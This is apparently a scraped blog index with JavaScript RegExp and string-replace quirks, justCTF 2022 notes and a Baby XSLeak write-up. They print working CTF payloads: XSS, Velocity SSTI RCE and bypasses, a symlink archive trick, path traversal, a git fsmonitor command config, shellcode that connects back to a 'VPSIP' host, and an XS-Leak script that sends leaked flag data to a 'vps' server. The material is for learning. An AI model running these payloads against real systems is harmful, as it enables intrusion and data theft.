influenced by Java. In JavaScript creator Brendan Eich | True Technologist Ep 1, the father of JavaScript, Brendan Eich, also briefly mentioned some of the history of that time. In addition, there are also opinions on TypeScript and WebAssembly. If you are interested, you can listen to it. This article only mentions a small part of the history, and there are many interesting stories after that. However, I think I can’t write better than “JavaScript: The First 20 Years”, so I will stop here for the history part. If you are interested in learning more about the early design and history of JavaScript, I recommend this book again. References: Wikipedia: Java applet Wikipedia: JavaScript Taiwan Internet Development Chronology (1985~2014) Re: applet is about to become history? Understand “The World of JavaScript” in 10 Minutes JS history New era, new trend WebOS [17] Do you need JavaScript The Hard Exploration of Technical Applications Java-to-Javascript Communication Using JavaScript in an Applet: Applet Jar «Development« JavaScript DHTML NETSCAPE AND SUN ANNOUNCE JAVASCRIPT, THE OPEN, CROSS-PLATFORM OBJECT SCRIPTING LANGUAGE FOR ENTERPRISE NETWORKS AND THE INTERNET JavaScript: The First 20 Years","link":"/2022/01/15/en/js-history/"},{"title":"The Magical Features of RegExp and String Replacement in JavaScript","text":"Here are a few magical features that I recently encountered. Let’s start with a few challenges: Challenge OneGuess what the result of the following code will be? var regexp = /huli/g var str = 'blog.huli.tw' var str2 = 'example.huli.tw' console.log(regexp.test(str)) // ??? console.log(regexp.test(str2)) // ??? Challenge TwoFirst, you enter a password, and then you enter a piece of code. Can you get an already missing variable? var password = prompt('input password') while (!/^[a-zA-Z0-9]+$/.test(password)) &#123; console.log('invalid password') password = prompt('input password') &#125; password = '' // 如果可以在底下動態執行程式碼，拿得到 password 嗎？ eval(prompt('try to get password')) Challenge ThreeWill the following code cause any problems? If so, what kind of problems? How to trigger it? var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl Stateful RegExpGuess what the result of the following code will be? var regexp = /huli/g var str = 'blog.huli.tw' var str2 = 'example.huli.tw' console.log(regexp.test(str)) // ??? console.log(regexp.test(str2)) // ??? Everyone would think that both are true, right? But the answer is true and false, and even if you write it like this, the second one is also false: var regexp = /huli/g var str = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.test(str)) // false There will be such a result because RegExp is stateful if there is a global or sticky flag. RegExp has a lastIndex property that records the last matching position. The next time test is used, it will start searching from lastIndex. If it cannot be found, lastIndex will automatically be set to zero. var regexp = /huli/g var str = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.lastIndex) // 9，因為 str[5..8] 是配對到的 'huli' console.log(regexp.test(str)) // false console.log(regexp.lastIndex) // 0，因為找不到所以自動歸零 console.log(regexp.test(str)) // true，此時再找一次就可以找到了，因為 lastIndex 是 0 console.log(regexp.lastIndex) // 9 Therefore, based on the characteristics of lastIndex mentioned above, this looks fine at first glance: var regexp = /huli/g var str = 'huli.tw' var str2 = 'blog.huli.tw' console.log(regexp.test(str)) // true console.log(regexp.test(str2)) // true But it doesn’t mean there are no bugs. The reason why the above paragraph looks fine is only because after the first search, lastIndex is 4, and the position where huli appears in str2 starts from 5, so it can still be found. If the last two lines are swapped, unexpected results will occur. In short, be careful with this feature when using global RegExp. For security, you can pay attention to these potential bugs and see if there are any exploitable areas. The Magical Recording Properties of RegExpContinuing with the small challenges at the beginning: var password = prompt('input password') while (!/^[a-zA-Z0-9]+$/.test(password)) &#123; console.log('invalid password') password = prompt('input password') &#125; password = '' // 如果可以在底下動態執行程式碼，拿得到 password 嗎？ eval(prompt('try to get password')) The variable has already been cleared, so it cannot be obtained. But we can use a magical property on RegExp to get it, called: RegExp.input, which records the input of the last regepx.test() match: /hello/.test('hello world') console.log(RegExp.input) // hello world console.log(RegExp.$_) // 同上 In addition, other parameters are also recorded: RegExp.lastMatch ($&amp;) RegExp.lastParen ($+) [RegExp.leftContext ($&#96;)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext) RegExp.rightContext ($’) I first learned about this technique in DiceCTF 2022 - web&#x2F;nocookies. Special Variables in RegExpIn the third challenge of the PlaidCTF, we were given the following code: var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl Since the double quotes were filtered out, it should not be possible to escape the attribute, and since the &gt; was also removed, it should not be possible to close the tag. However, when doing string replacement, there is something called special replacement patterns. For example, $&amp;#x60; can get the “front” of the string replacement, and $&#39; can get the back. An example will make it easier to understand: const str = '123&#123;n&#125;456' // 123A456 console.log(str.replace('&#123;n&#125;', 'A')) // 123123A456，原本 &#123;n&#125; 的地方變成 123A console.log(str.replace('&#123;n&#125;', \"$`A\")) // 123456A456，原本 &#123;n&#125; 的地方變成 456A console.log(str.replace('&#123;n&#125;', \"$'A\")) Therefore, returning to our question: var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl The string after ｛&#123;value&#125;&#125; is &quot;&gt;. Although both of these characters are filtered out, we can use $&#39; to get these two characters. Therefore, the answer to this question is $&#39;&lt;style onload=alert(1) : var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = \"$'&lt;style onload=alert(1) \" value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl By using $&#39;, which is &quot;&gt;, to close the tag, we can use other tags for XSS. The final result is: &lt;input type=\"submit\" value=\"\">&lt;style onload=alert(1) \"> I first learned about this in PlaidCTF 2022 - YACA, but a similar technique seems to have appeared in DragonCTF 2021 - Webpwn.","link":"/2022/04/14/en/javascript-string-regexp-magic/"},{"title":"justCTF 2022 Notes","text":"This holiday, there was justCTF and WeCTF, which was all web. I originally wanted to participate in both, so if I got stuck on one, I could switch to the other. However, I got stuck on both XD This time, justCTF had many good web challenges. As usual, I will write some notes and record some keywords: zip&#x2F;tar symlink Velocity SSTI Golang path git principle scp principle xsleak, STTF + :target selector The order below is sorted by the number of solves, with more solves at the top. Symple Unzipper(40 solves)The goal of this challenge is to read the flag.txt file in the same directory as the server code. The core code is as follows: ROOT_DIR = Path(__file__).absolute().parent UPLOAD_DIR = ROOT_DIR / \"uploads\" FLAG_PATH = ROOT_DIR / \"flag.txt\" SOURCE_PATH = ROOT_DIR / \"server.tar.gz\" @app.post(\"/extract\", tags=[\"extract\"]) async def extract(file: UploadFile): \"\"\"Extracts the given ZIP and returns a JSON object containing the contents of every file extracted\"\"\" with TemporaryDirectory(dir=UPLOAD_DIR) as tmpdir: file_to_extract = Path(tmpdir) / file.filename with open(file_to_extract, \"wb\") as f: while True: data = await file.read(2048) if not data: break f.write(data) # make sure the file is a valid zip because Python's zipfile doesn't support symlinks (no hacking!) if not is_zipfile(file_to_extract): raise HTTPException(status_code=415, detail=f\"The input file must be an ZIP archive.\") with TemporaryDirectory(dir=tmpdir) as extract_to_dir: try: extract_archive(str(file_to_extract), outdir=extract_to_dir) except PatoolError as e: raise HTTPException(status_code=400, detail=f\"Error extracting ZIP &#123;file_to_extract.name&#125;: &#123;e!s&#125;\") return read_files(extract_to_dir) First, use is_zipfile to check if it is a zip file, and then use patool’s extract_archive to decompress the file. From the file name, it seems to be related to symlink. During the competition, I tried to use zip to package symlink files, but it didn’t work. This challenge was later solved by my teammate. I saw someone post the solution on discord: ln -fs ..&#x2F;..&#x2F;..&#x2F;flag.txt . touch a zip a.zip -xi a tar --owner 0 --group 0 -cvf payload.tar flag.txt a.zip curl -v $&#123;1:-symple-unzipper.web.jctf.pro&#125;&#x2F;extract -F &#39;file&#x3D;@payload.tar&#39; From the discussion in discord, it seems that after doing the above, the file header is in tar format, and the end is the zip file you packaged. The implementation of is_zipfile will cause this type of file to pass (it seems to check the magic byte first, and if it cannot be found, it will be judged in other ways), so it is judged as true, and then it will be decompressed by the extract_archive below, and then your symlink will be preserved. Velociraptor(22 solves)This challenge is Velocity’s SSTI. If you search online, you will find this RCE payload: #set($e=\"e\") $e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"touch /tmp/rai4over\") But this challenge locked it, so it cannot be used. The flag is in the root directory, so you don’t need RCE, just need to be able to read the file. Velocity has an include command: #include( &quot;&#x2F;flag.txt&quot; ) But if you use it directly, it will give you an error: Malicious input detected (#include, #parse) You need to find a way to bypass it. I saw someone do it this way on discord: #set($x&#x3D;&quot;#includ&quot;) #set($y&#x3D;&#39;e(&quot;&#x2F;flag.txt&quot;)&#39;) #set($a&#x3D;&quot;$x$y&quot;) #evaluate($a) And someone used unicode to bypass it: #set($x&#x3D;&quot;#includ\\u0065(&#39;&#x2F;flag.txt&#39;)&quot;) $x GoBucket(18 solves)The core code of this challenge is as follows: r.HandleFunc(\"/files/&#123;bucketId&#125;/&#123;filename&#125;\", handleBucket) bucketPath := filepath.Join(\"./buckets/\", bucketId) // [...] filePath := filepath.Join(bucketPath, filename) After matching the URL to the bucketId and filename, concatenate the path and get the file. Our goal is the buckets/secret_file file. The solution is: curl --path-as-is &#39;http:&#x2F;&#x2F;gobucket.web.jctf.pro&#x2F;files&#x2F;\\&#x2F;secret_file&#39; From the discussion, it seems that golang does not turn /\\/ into /// when processing URL matching, so \\ becomes a parameter, and when constructing a filepath, it can potentially be dangerous as it allows you to skip&#x2F;escape a directory. gitara(12 solves)The code for this challenge is as follows: &lt;?php if (!isset($_POST[&#39;domain&#39;]) || preg_match(&#39;&#x2F;[^a-z0-9.-]&#x2F;ims&#39;, $_POST[&#39;domain&#39;]) !&#x3D;&#x3D; 0) &#123; highlight_file(__FILE__); &#125; else &#123; $dir &#x3D; &#39;&#x2F;tmp&#x2F;gitara&#39;.rand(); mkdir($dir); system(&quot; \\ cd $dir &amp;&amp; \\ timeout 2s sshpass -phunter2 scp -o StrictHostKeyChecking&#x3D;no &#39;justctf-gitara@$_POST[domain]:*&#39; . &amp;&amp; \\ timeout 1m git status; \\ rm -rf $dir&quot;); &#125; The goal is actually quite clear: the chall server will use scp to copy files from your server and then execute git status, so you need to use some of git’s features to achieve RCE. At the time, a teammate posted this config: [core] repositoryformatversion &#x3D; 0 filemode &#x3D; true bare &#x3D; false logallrefupdates &#x3D; true fsmonitor &#x3D; &quot;echo \\&quot;Pwned as $(id)\\&quot;&gt;&amp;2; false&quot; There seems to be a fairly complete explanation here: 2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md, but it’s a bit long and I haven’t read it yet. In short, if you replace the gitconfig with the above content and then use git status, the command after fsmonitor will be executed. However, the difficulty of this challenge is not in this, but in how to throw a git repo onto the chall server. When you use git init, a .git folder will be added to the directory, which contains: HEAD config description hooks&#x2F; info&#x2F; objects&#x2F; refs&#x2F; However, the command during scp is server:*, so: Hidden files starting with . will not be matched Folders will not be downloaded because -r is not used After discussing with my teammates for a while, I found that if you adjust the config, you can reduce it to only four files and you don’t need the .git folder: [core] repositoryformatversion &#x3D; 0 bare &#x3D; false worktree &#x3D; .&#x2F; fsmonitor &#x3D; &quot;echo \\&quot;Pwned as $(id)\\&quot;&gt;&amp;2; false&quot; The file structure is as follows: drwxr-xr-x 6 huli staff 192 6 14 22:00 . drwxr-xr-x 3 huli staff 96 6 14 21:57 .. -rw-r--r-- 1 huli staff 23 6 14 21:57 HEAD -rw-r--r-- 1 huli staff 115 6 14 21:59 config drwxr-xr-x 4 huli staff 128 6 14 21:57 objects drwxr-xr-x 4 huli staff 128 6 14 21:57 refs Executing git status in the subdirectory will run the fsmonitor command. However, the objects and refs folders must exist. I tried to replace them with files, but the check failed. Later, I went to look at the git source code to see how it was checked. The relevant code is here: https://github.com/git/git/blob/master/setup.c#L341 /* * Test if it looks like we're at a git directory. * We want to see: * * - either an objects/ directory _or_ the proper * GIT_OBJECT_DIRECTORY environment variable * - a refs/ directory * - either a HEAD symlink or a HEAD file that is formatted as * a proper \"ref:\", or a regular file HEAD that has a properly * formatted sha1 object name. */ int is_git_directory(const char *suspect) &#123; struct strbuf path = STRBUF_INIT; int ret = 0; size_t len; /* Check worktree-related signatures */ strbuf_addstr(&amp;path, suspect); strbuf_complete(&amp;path, '/'); strbuf_addstr(&amp;path, \"HEAD\"); if (validate_headref(path.buf)) goto done; strbuf_reset(&amp;path); get_common_dir(&amp;path, suspect); len = path.len; /* Check non-worktree-related signatures */ if (getenv(DB_ENVIRONMENT)) &#123; if (access(getenv(DB_ENVIRONMENT), X_OK)) goto done; &#125; else &#123; strbuf_setlen(&amp;path, len); strbuf_addstr(&amp;path, \"/objects\"); if (access(path.buf, X_OK)) goto done; &#125; strbuf_setlen(&amp;path, len); strbuf_addstr(&amp;path, \"/refs\"); if (access(path.buf, X_OK)) goto done; ret = 1; done: strbuf_release(&amp;path); return ret; &#125; But I didn’t see any clues, and I didn’t solve this challenge. After the game, I found out that I missed a detail: access(path.buf, X_OK). Here, only the X of the file is checked, so if you add x to the file using chmod +x, the check can be passed. Therefore, you can successfully build a legal git repo without any folders. But what I learned from this challenge is not just that. There is also a discussion on discord, where the author thought that the .git file was needed, but :* in scp does not match this file, what should I do? The answer is: “Change your own server’s scp”, like this: root@ip-172-31-28-181:&#x2F;usr&#x2F;bin# cat scp #!&#x2F;usr&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;scp.orig -f .git HEAD config elf objects refs Why does this work? This is related to the principle of scp. I originally thought that scp was a program that could help you fetch remote files through ssh. Later, I learned that your server also needs to install scp, and scp will communicate with each other as both a server and a client. This means that when I execute scp remote:* . on my machine, it is actually: Local scp executes ssh to connect to remote Local scp calls remote scp Remote scp sends the file list to local scp Local scp fetches the files In short, what files are matched is sent by remote scp using the -f flag, which is not documented. Therefore, we can see that the above solution overwrites scp, so you can decide which files to transfer. For more detailed introductions, please refer to: SCP - Familiar, Simple, Insecure, and Slow 粗析openssh 中scp代码逻辑 scp源码浅析 Baby XSLeak(7 solves)This question has an English version, and I’m too lazy to write it in Chinese: https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/ In short, it uses the onload time of &lt;object&gt; to determine the size of the response. If there is more content, it should take more time to render, and the onload will trigger later. Foreigner(5 solves)The code is as follows: &lt;?php // flag is being set every 5 seconds if(isset($_GET['FLAG']) &amp;&amp; filter_var($_SERVER['REMOTE_ADDR'],FILTER_VALIDATE_IP) === \"172.20.13.37\")&#123; $f=$_GET['FLAG']; if(strstr($f,\"justCTF&#123;\")) &#123; putenv(\"FLAG=$f\"); die(\"flag $f set\"); &#125; &#125; if(isset($_GET['x'])) &#123; putenv(\"FLAG=aaand_it's_gone\"); echo' &lt;style> div &#123; display: table; margin-right: auto; margin-left: auto; &#125; &lt;/style> &lt;body> &lt;div>&lt;img src=\"itsgone.gif\" width=\"497\" height=\"280\">&lt;/div> &lt;/body> '; eval($_GET['x']); &#125; else &#123; print(show_source(__file__, true)); &#125; There is eval that can execute any code, but there are a lot of things in disable_functions. I didn’t understand the final solution very well. It seems that you need to write some shell code and use a function that can be used. Here is the solution I saw in discord (by Tony_Bamanaboni): from pwn import * from binascii import hexlify context.arch = \"amd64\" payload = \"addr: .quad 0\\nnop\\nnop\\nnop\\nnop\\nnop\" payload += \"\"\" call $+5 pop r13 and r13, -4096 mov r13, [r13] \"\"\" payload += shellcraft.amd64.linux.connect(\"VPSIP\", 6666) payload += shellcraft.amd64.linux.egghunter(b'CTF&#123;') payload += \"\"\"mov rsi, rdi mov rdi, rbp mov rdx, 50 mov rax, 1 syscall ret \"\"\" payload = hexlify(asm(payload)).decode() php = ''' $pl=hex2bin(\"%s\"); $l=FFI::cdef(\"char* mmap(int,int,int,int,int,int);void alarm(int);void signal(int,void*);\",\"libc.so.6\"); $p=$l->mmap(0,0x1000,7,0x21,-1,0); $p2=$l->environ; FFI::memcpy($p,FFI::addr($p2),8); for($idx=8;$idx&lt;strlen($pl);$idx++)&#123;$p[$idx]=$pl[$idx];&#125; $l->signal(14,$p+8); $l->alarm(5); ''' % payload print(php.replace('\\n', '').replace('+', '%2b')) Web API intended(4 solves)This question gives you an API document that allows you to register, log in, modify data, and create some data, etc. When I was working on it, I saw that there was a /jwk URL in the JWT, and when I tried to change it to something else, I found that I didn’t receive a request, so I went to play other questions first. From the discussion on discord afterwards, the solution is that there is a mass assignment bug in changing user data, which can change yourself to is_admin: true, and then there is XML that can be eaten by other endpoints, so XXE and read /flag.txt, and it’s over. The concept doesn’t seem too difficult, but after all, it’s a black box, so there are more things to test, and sometimes you may get stuck trying a few paths, and then go to solve the white box questions first. Ninja(1 solves)An interesting XSleak question that blocked all the unintended things I could think of. The core code of this question is as follows: &#123;% extends \"base.html\" %&#125; &#123;% block css %&#125; &lt;style> .consent_color &#123; color: &#123;&#123; consent.color_palette &#125;&#125; &#125; &lt;/style> &#123;% endblock %&#125; &#123;% block content %&#125; &lt;section class=\"container\" id=\"generate-form\"> &lt;div class=\"row g-4\"> &lt;div class=\"col-lg-6 col-md-8 mx-auto\"> &lt;h2 class=\"mb-3\">Cookie consent&lt;/h2> &lt;hr class=\"my-4\" /> &lt;div class=\"col-10\"> &lt;div class=\"card shadow-sm\"> &lt;div class=\"card-body\"> &lt;div class=\"d-flex justify-content-between align-items-center\"> &lt;div class=\"btn-group \"> &lt;!--FIX: reported HTML injection, added filters --> &lt;a href=\"#&#123;&#123;link|replace('&lt;',\"&amp;gt;\")|replace('>',\"&amp;lt;\")|safe&#125;&#125;\">Open Preferences&lt;/a> &lt;/div> &lt;small class=\"text-muted\">❤️&lt;/small> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/div> &lt;/section> &#123;% endblock %&#125; You can clearly see CSS injection (the server blocks up to 140 characters), and control of the href of &lt;a&gt; and the addition of arbitrary attributes. The flag is the admin user, which appears in the upper part, and the content looks like this: &lt;div class=\"nickname\">Hello, &lt;span>A&lt;/span>&lt;span>e&lt;/span>&lt;span>f&lt;/span>&lt;span>2&lt;/span>&lt;span>i&lt;/span>&lt;span>k&lt;/span>&lt;span>o&lt;/span>&lt;span>f&lt;/span>&lt;span>j&lt;/span>&lt;span>2&lt;/span>&lt;span>o&lt;/span>&lt;span>i&lt;/span>&lt;span>f&lt;/span>&lt;span>1&lt;/span>&lt;span>1&lt;/span>&lt;span>2&lt;/span>&lt;span>3&lt;/span>&lt;span>1&lt;/span>&lt;span>2&lt;/span>&lt;span>3&lt;/span>&lt;span>1&lt;/span>!&lt;/div> The CSP looks like this: default-src ‘none’; font-src http://ninja.web.jctf.pro/static/; form-action ‘self’; object-src ‘none’; script-src http://ninja.web.jctf.pro/static/; base-uri ‘none’; style-src http://ninja.web.jctf.pro/static/ ‘unsafe-inline’; img-src * data:; Basically, only img is unblocked, and everything else is blocked. Then there is a key point that the bot for this question installed a package called “ninja cookie”, which seems to automatically click on buttons that do not accept cookies. The bot for this question is also very classic, blocking a lot of things: import traceback from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.webdriver.common.by import By import os from flask import Flask, request import time app = Flask(__name__) import sys import logging TASK = os.environ.get('BASE_URL') or \"http://127.0.0.1:5000\" flag = os.environ.get('FLAG') or 'justCTF&#123;fake&#125;' pwd = os.environ.get('PASSWD') or 'admin' def visit_url(url, timeout): if type(url) != str or not url.startswith(\"http\"): return print(\"Visiting:\",url, file=sys.stdout, flush=True) options = Options() options.add_argument('no-sandbox') options.add_argument('disable-dev-shm-usage') options.add_argument('disable-infobars') options.add_argument('disable-background-networking') options.add_argument('disable-default-apps') options.add_argument('disable-gpu') options.add_argument('disable-sync') options.add_argument('disable-translate') options.add_argument('disable-lazy-image-loading') options.add_argument('hide-scrollbars') options.add_argument('metrics-recording-only') options.add_argument('mute-audio') options.add_argument('no-first-run') options.add_argument('dns-prefetch-disable') options.add_argument('safebrowsing-disable-auto-update') options.add_argument('media-cache-size=1') options.add_argument('disk-cache-size=1') options.add_argument('disable-features=LazyImageLoading,AutomaticLazyImageLoading,LazyFrameLoading,AutomaticLazyFrameLoading,AutoLazyLoadOnReloads') options.add_argument('--js-flags=--noexpose_wasm,--jitless') options.add_argument('hide-scrollbars') options.add_argument('load-extension=ninja-cookie') try: browser = webdriver.Chrome('/usr/local/bin/chromedriver', options=options, service_args=['--verbose', '--log-path=/tmp/chromedriver.log']) browser.get(TASK+\"/login\") WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete') inputElement = browser.find_element_by_id(\"username\") inputElement.send_keys(flag) inputElement = browser.find_element_by_id(\"password\") inputElement.send_keys(pwd) browser.find_element_by_id(\"submit\").click() WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete') time.sleep(timeout) browser.get(url) WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete') time.sleep(30) except: print('Error visiting', url, traceback.format_exc(), file=sys.stderr, flush=True) finally: print('Done visiting', url, file=sys.stderr, flush=True) @app.route(\"/\", methods=['GET']) def visit(): visit_url(request.args.get(\"url\"), 1) return \"ok\" First, let me talk about my thoughts after seeing this question. Because CSS injection can be done and the content is on the page, I naturally think of using font-face with unicode-range, like this: @font-face &#123; font-family:\"A\"; src: url(https://example.com); unicode-range: U+006A; &#125; .nickname > span:nth-child(1) &#123; font-family: A1; &#125; This way, as long as the first character of the flag is U+006A, the specified font will be applied, but the font is restricted by CSP and cannot be loaded, so this trick cannot pass. Another trick I thought of is to use size-adjust with a local font: @font-face &#123; font-family:\"A\"; src: local(Arial); size-adjust: 1000%; unicode-range: U+006A; &#125; .nickname > span:nth-child(1) &#123; font-family: A1; &#125; The screen will look like this: My original idea was that if ninja cookie detects that the button appears on the screen before clicking it, I can use this trick to push the button off the screen so that ninja cookie won’t click it. Then, if the font doesn’t match, the button won’t be pushed away and will be clicked. Through this oracle, I can leak out the flag. However, there are two problems. The first problem is that in the screenshot above, the enlarged font extends to the right and up, but cannot be pushed down to the content below. This is easily solved by changing the layout with CSS to make the layout horizontal: The second problem is the most fatal, which is that ninja cookie’s :visible means whether an element has width and height, and if so, it is visible. Therefore, it doesn’t matter whether it appears on the screen or not, so this trick is gg. The second trick I thought of is cache probing, which can be written like this: @font-face &#123; font-family: \"A1\"; src: url(/static/bootstrap.min.css?q=1); unicode-range: U+0041; &#125; If there is a match, the font will be loaded from /static/bootstrap.min.css?q=1. Although it won’t load successfully, the browser should cache it, and even if there is no cache, there is a 304 not modified mechanism, so the response should be faster than other things. However, after testing, I found that the first problem is that the speed is not much different, and the second problem is that the bot uses the disk-cache-size=1 flag, which is really thoughtful. By the way, commonly used scroll bars and lazy loading images are also blocked. The third trick I thought of is that we can do this: @font-face &#123; font-family: \"A1\"; src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2), .... url(/static/bootstrap.min.css?q=500); unicode-range: U+0041; &#125; Because the bot’s code looks like this: browser.get(url) WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete') time.sleep(30) Assuming the font doesn’t match, the time to get the response when visiting the bot should be around 30 seconds. If there is a match, a bunch of requests will be sent to get the font, and the network will always have something, so it will take longer to meet the stop condition and get the response. So the response time can tell if there is a match. But this trick doesn’t work either because CSS can only have a maximum of 140 characters. There are other tricks that I haven’t tried, such as combining size-adjust with animation mentioned earlier. If there is a match, keep switching fonts frantically, like this: @keyframes t &#123; 0% &#123; font-family: A1; &#125; 50% &#123; font-family: rest; &#125; &#125; @font-face &#123; font-family: \"A1\"; size-adjust: 1000%; src: local(Arial); unicode-range: U+0041; &#125; .nickname > span:nth-child(1) &#123; font-family: A1; animation: 0.01s t 0 infinite; &#125; By constantly switching fonts, the width will keep changing, and the layout will have to be constantly rearranged, which should be more performance-intensive. As long as a way to detect this is found, it will be fine. The first possibility is that the speed at which ninja cookie clicks will slow down, but I think the extension is handled by another thread, although I haven’t tested it. The second possibility is that the iframe stacks the website and its own exploit together, and then uses some JS to calculate this, but because this question blocks iframes, it is also impossible. Anyway, this is just an idea, but there is still a long way to go to implement or succeed. Below, I will talk about the official solution, which uses :target selector with :before to load the background image. I know there is ::target-text to match the highlighted part, but I’ve seen that only some properties can be used, and I don’t know that :target will match. So the solution to this question is to use :target:before to load the image, and then use HTML injection + ninja cookie’s click to trigger the scroll. The complete solution can be found here: https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb Related techniques can be found here: New technique of stealing data using CSS and Scroll-to-Text Fragment feature. Dank Shark(0 solves)I didn’t really look at this problem, so I don’t know what’s going on. Maybe I’ll come back and take a look later (although writing this probably means I won’t). Here’s the solution discussed in the discord thread: Use 0day request smuggling in the js_challenge module. Just write a short 64-length XSS in the nickname (iptables was not working on remote). Use cache poisoning&#x2F;golang sync.pool buffer bug (if you close http connection without reading you have leak in next connection).","link":"/2022/06/14/en/justctf-2022-writeup/"},{"title":"justCTF 2022 - Baby XSLeak Write-up","text":"Last weekend, I played justCTF 2022 with my team Water Paddler, and we got 7th place! It’s the write-up about one of the XSleak challenges, an easier one. If you want to see the hard one, you can refer to this awesome writeup: New technique of stealing data using CSS and Scroll-to-text Fragment feature. About the challengeIt’s a simple web service, and there are three endpoints: &#x2F; &#x2F;search &#x2F;debug The core function is as below: flagStr := os.Getenv(\"FLAG\") mux := http.NewServeMux() mux.HandleFunc(\"/search/\", func(w http.ResponseWriter, r *http.Request) &#123; if !isPrivateIP(getIP(r)) &#123; w.WriteHeader(http.StatusForbidden) return &#125; handleSearch(w, r, flagStr) &#125;) mux.HandleFunc(\"/debug/\", func(w http.ResponseWriter, r *http.Request) &#123; handleSearch(w, r, \"justCTF&#123;fake_flags&#125;\") &#125;) func handleSearch(w http.ResponseWriter, r *http.Request, flag string) &#123; query := r.URL.Query().Get(\"search\") msg := r.URL.Query().Get(\"msg\") if !strings.Contains(flag, query) &#123; w.Write([]byte(\"Not found\")) &#125; else &#123; w.Write(append([]byte(msg), flag...)) &#125; &#125; You can pass two query strings search and msg, if search is in the flag, the server will return msg+flag, otherwise Not Found. /search can only be accessed within the internal network via the bot, so they provide another /debug endpoint for the player to test. For example, /debug?search=NOT_EXIST&amp;msg=hello returns Not found, and/debug?search=justCTF&amp;msg=hello returns hellojustCTF&#123;fake_flags&#125; We can use this difference to leak the flag char by char. By the way, we can’t do XSS because of the headers: w.Header().Set(&quot;X-Content-Type-Options&quot;, &quot;nosniff&quot;) w.Header().Set(&quot;Content-Security-Policy&quot;, &quot;script-src &#39;none&#39;;&quot;) w.Header().Set(&quot;Content-Type&quot;, &quot;text&#x2F;plain&quot;) Also, error events will not work because of text/plain content type. OracleWhat is the oracle to leak the flag? We can use something like: /search?search=a&amp;msg=$&#123;&#39;A&#39;*1000000&#125; If a is not in the flag, the response is just Not Found, otherwise A*1000000+flag More content takes more time for the browser to render, so we can use the &lt;object&gt; tag to embed the URL and measure the load time, see the following for the actual code: function leak(char, callback) &#123; return new Promise(resolve => &#123; let ss = 'just_random_string' // for msg, I use random string to avoid cache, but maybe it's not needed let url = `http://baby-xsleak-ams3.web.jctf.pro/search/?search=$&#123;char&#125;&amp;msg=`+ss[Math.floor(Math.random()*ss.length)].repeat(1000000) let start = performance.now() let object = document.createElement('object'); object.width = '2000px' object.height = '2000px' object.data = url; object.onload = () => &#123; object.remove() let end = performance.now() resolve(end - start) &#125; object.onerror = () => console.log('Error event triggered'); document.body.appendChild(object); &#125;) &#125; Initially, I didn’t set object width and height, but later on, I found that it’s important because the default size is too small to make a difference in the load time. ExploitHere is my exploit in the end: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;/head> &lt;body> &lt;img src=\"https://deelay.me/30000/https://example.com\"> &lt;script> fetch('https://deelay.me/30000/https://example.com') function send(data) &#123; fetch('http://vps?data='+encodeURIComponent(data)).catch(err => 1) &#125; function leak(char, callback) &#123; return new Promise(resolve => &#123; let ss = 'just_random_string' let url = `http://baby-xsleak-ams3.web.jctf.pro/search/?search=$&#123;char&#125;&amp;msg=`+ss[Math.floor(Math.random()*ss.length)].repeat(1000000) let start = performance.now() let object = document.createElement('object'); object.width = '2000px' object.height = '2000px' object.data = url; object.onload = () => &#123; object.remove() let end = performance.now() resolve(end - start) &#125; object.onerror = () => console.log('Error event triggered'); document.body.appendChild(object); &#125;) &#125; send('start') let charset = 'abcdefghijklmnopqrstuvwxyz_&#125;'.split('') let flag = 'justCTF&#123;' async function main() &#123; let found = 0 let notFound = 0 for(let i=0;i&lt;3;i++) &#123; await leak('..') &#125; for(let i=0; i&lt;3; i++) &#123; found += await leak('justCTF') &#125; for(let i=0; i&lt;3; i++) &#123; notFound += await leak('NOT_FOUND123') &#125; found /= 3 notFound /= 3 send('found flag:'+found) send('not found flag:'+notFound) let threshold = found - ((found - notFound)/2) send('threshold:'+threshold) if (notFound > found) &#123; return &#125; // exploit while(true) &#123; if (flag[flag.length - 1] === '&#125;') &#123; break &#125; for(let char of charset) &#123; let trying = flag + char let time = 0 for(let i=0; i&lt;3; i++) &#123; time += await leak(trying) &#125; time/=3 send('char:'+trying+',time:'+time) if (time >= threshold) &#123; flag += char send(flag) break &#125; &#125; &#125; &#125; main() &lt;/script> &lt;/body> &lt;/html> When exploiting the xsleak challenge, I need to send the log back to my server to know if anything is wrong. For example, the threshold is sometimes inaccurate, so I need to update the exploit a few times manually. Also, there are a few details to make the exploit faster and more stable. First, I send a few requests before measuring the load time. The first few requests are not that accurate due to DNS lookup, initial connection, etc. Second, I send a request three times and take it’s average to be more accurate(but the trade-off is that the exploit will take more time) Third, you can leak the charset first to reduce the time and request significantly: // 